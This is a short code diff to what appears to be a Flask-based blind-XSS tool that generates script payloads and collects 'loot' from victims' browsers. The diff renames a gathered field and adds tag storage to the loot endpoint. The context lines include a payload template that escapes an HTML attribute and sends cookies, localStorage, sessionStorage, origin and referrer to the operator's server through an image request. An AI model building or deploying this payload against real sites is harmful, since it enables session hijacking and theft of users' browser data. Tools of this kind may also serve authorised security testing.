@@ -56,7 +56,7 @@ def xss_generate():
             payload = payload_start + payload_mid + payload_end
             return jsonify({"status": "OK", "detail": payload}), 200
 
-        elif "local_storage" in to_gather or "session_storage" in to_gather or "cookies" in to_gather or "origin" in to_gather or "referrer" in to_gather:
+        elif "local_storage" in to_gather or "session_storage" in to_gather or "cookies" in to_gather or "origin_url" in to_gather or "referrer" in to_gather:
             payload_start = f'\'>"><script>new Image().src="{url}/api/x/{xss_type}/{client.uid}?'
 
             payload_tags = f"tags={tags}" if tags else ""
@@ -208,6 +208,9 @@ def client_loot_get():
                 loot[element[0]].append({hit.id: ""})
             else:
                 loot[element[0]].append({hit.id: element[1]})
+            if hit.tags:
+                if "tags" not in loot:
+                    loot["tags"] = {}
+                loot["tags"][hit.id] = json.loads(hit.tags)
 
-    print(loot)
     return jsonify(loot), 200
